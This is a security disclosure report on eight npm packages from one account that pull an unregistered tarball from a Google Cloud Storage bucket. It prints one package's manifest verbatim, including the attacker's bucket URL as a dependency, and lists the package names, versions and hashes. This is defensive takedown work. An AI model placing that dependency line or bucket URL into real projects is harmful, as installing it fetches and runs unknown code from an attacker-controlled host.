# Off-registry payload delivery via `ltidi.storage.googleapis.com`

**Status:** prepared for disclosure, not yet sent.
**Intended recipients:** Google Cloud abuse, npm security.
**Prepared:** 2026-08-21
**Reporter:** norte-guard (npm publish-stream collector), engine v1.4.0

---

## Summary

Eight npm packages published by a single account declared a runtime dependency
on a tarball hosted in a Google Cloud Storage bucket rather than on the npm
registry. `npm install` fetches and executes that tarball. npm has since removed
all eight packages; the bucket is unaffected by that removal.

The packages themselves contain no code — 35 bytes exporting an empty object —
and no install script. The dependency URL in `package.json` is the whole of the
mechanism.

**This report does not state what `ltidisafe` contains.** The bucket was
deliberately not probed: a request would have told the operator that someone was
looking, and the object may still be needed as evidence. Every fact below is from
artifacts captured from the npm registry at publication time and held offline.

---

## The bucket

```
https://ltidi.storage.googleapis.com/depenconf/ltidisafe-<version>.tgz
```

Bucket: `ltidi` · Path prefix: `depenconf/` · Eight distinct object versions
referenced: `3.6.1`, `3.6.3`, `3.6.5`, `3.6.6`, `3.6.7`, `3.7.2`, `3.7.3`,
`3.7.4`.

---

## The packages

All published by npm account **`whltd4`**, all at version **`99.9.1`**.

| package | published (UTC) | captured (UTC) | `ltidisafe` version |
|---|---|---|---|
| `napi-raw` | 2026-08-13 05:17:04 | 2026-08-13 05:17:19 | 3.6.1 |
| `eslint-generate-release` | 2026-08-13 05:20:49 | 2026-08-13 05:21:07 | 3.6.3 |
| `check-audit` | 2026-08-13 05:23:26 | 2026-08-13 05:23:43 | 3.6.5 |
| `resolve-audit` | 2026-08-13 05:24:23 | 2026-08-13 05:24:39 | 3.6.6 |
| `cspell-esm` | 2026-08-13 05:25:26 | 2026-08-13 05:25:40 | 3.6.7 |
| `gunzip-js` | 2026-08-15 14:27:43 | 2026-08-15 14:27:57 | 3.7.2 |
| `depcruise-fmt` | 2026-08-15 14:30:45 | 2026-08-15 14:30:55 | 3.7.3 |
| `depcruise-baseline` | 2026-08-15 14:31:31 | 2026-08-15 14:31:39 | 3.7.4 |

Five names in eight minutes on 2026-08-13; three names in four minutes on
2026-08-15.

### Tarball hashes (SHA-256, as fetched from the registry)

| package | sha256 |
|---|---|
| `check-audit@99.9.1` | `118da10905f3b62cf2b5a640ce55619fbb3c863cc639e57dfecac8ecf7b3e75a` |
| `cspell-esm@99.9.1` | `e37c6a8ba58871aff90e39c81bfbfc98d0e4013d6f6a9c70a7a373b184c8b512` |
| `depcruise-baseline@99.9.1` | `693eaf0681a58724a97504cab3ad2c25149b61327ae9e1eecc6485006d4e05b0` |
| `depcruise-fmt@99.9.1` | `f555c94f59ba18a05bb37c6089f57f3ab27d6bc5246ce00b476ae68179c5b486` |
| `eslint-generate-release@99.9.1` | `4f5dec13327d76a9fd5a6cc98a07e998b0b583be6ecbaa8e329dcfa3c175b8ff` |
| `gunzip-js@99.9.1` | `1a0891248b169baac930fc59852c97742328e81c961ffb92caa0f3878b178595` |
| `napi-raw@99.9.1` | `54568c5a8a2e5dec9cf77154f6b58f854c5215c044f03d98dfb31a804d204cc3` |
| `resolve-audit@99.9.1` | `3c57b0807253dab100c4abfd0b6b11987d1835e0e281bb283d400430d475e7e3` |

All eight tarballs are held offline and can be provided on request.

---

## Package contents, in full

Each package is two files. `gunzip-js@99.9.1` verbatim:

```js
// package/index.js — 35 bytes
'use strict';
module.exports = {};
```

```json
// package/package.json — 317 bytes
{
  "name": "gunzip-js",
  "version": "99.9.1",
  "description": "",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "dependencies": {
    "ltidisafe": "https://ltidi.storage.googleapis.com/depenconf/ltidisafe-3.7.2.tgz"
  },
  "author": "",
  "license": "ISC"
}
```

The other seven are byte-for-byte the same shape, differing only in `name` and in
the `ltidisafe` version.

Note: there is **no install script**. The `scripts` block contains only the
`npm init` default `test` stub. Anything that executes does so from the fetched
dependency, not from these packages.

---

## Why the package names were chosen

All eight are plausible names in the JavaScript tooling namespace —
`gunzip-js`, `cspell-esm`, `depcruise-fmt`, `depcruise-baseline`,
`eslint-generate-release`, `resolve-audit`, `check-audit`, `napi-raw`. They read
as companions to real tools (`cspell`, `dependency-cruiser`, `eslint`, `napi`).

The version `99.9.1` is a semver squat: any dependency range that resolves to the
highest available version resolves to this one.

---

## Why this is being reported to Google Cloud

npm removed all eight packages. That removal reaches what npm hosts. The
executable payload is an object in a Google Cloud Storage bucket, which npm
cannot remove and which remains reachable at the URLs above.

Requested: review of the bucket `ltidi` under Google Cloud's abuse policy, and
preservation of the objects under `depenconf/` if action is taken, so that
analysis remains possible.

---

## Why this is being reported to npm

Two points, offered as observations rather than as demands:

1. **The eight packages were indistinguishable from empty packages by content.**
   Any scanner that reads tarballs sees 35 bytes exporting `{}` and is right to
   pass them. The signal is entirely in the `dependencies` field.

2. **An off-registry dependency specifier is rare enough to be worth surfacing.**
   Over a sample of 25,394 publications from the npm change feed covering 13,344
   distinct package names, 42 names (0.315%) declare a dependency that is not a
   registry range, across five distinct destinations. Four of the five are
   ordinary — `file:` links, `github:` shorthand, `cdn.sheetjs.com`, which
   distributes off-registry deliberately — and each is used by roughly one
   account per destination. The `ltidi` bucket is the only destination in the
   sample used by one account across many package names.

---

## Provenance and limits

- All artifacts were captured directly from `registry.npmjs.org` within 8–20
  seconds of publication, before removal, and have been held offline since.
- Timestamps are npm's own, from the packument `time` field.
- The account attribution `whltd4` is from `_npmUser` on each published version.
- **`ltidisafe` was never fetched.** No claim is made about its contents,
  behaviour, or whether the objects still exist.
- This collector applies its own capture filter, so the 0.315% prevalence figure
  describes an enriched sample of the publish stream and not npm as a whole.

---

## Contact

Prepared by the norte-guard project. Captured artifacts, packuments, and the
change-feed records for all eight publications are available to either recipient
on request.
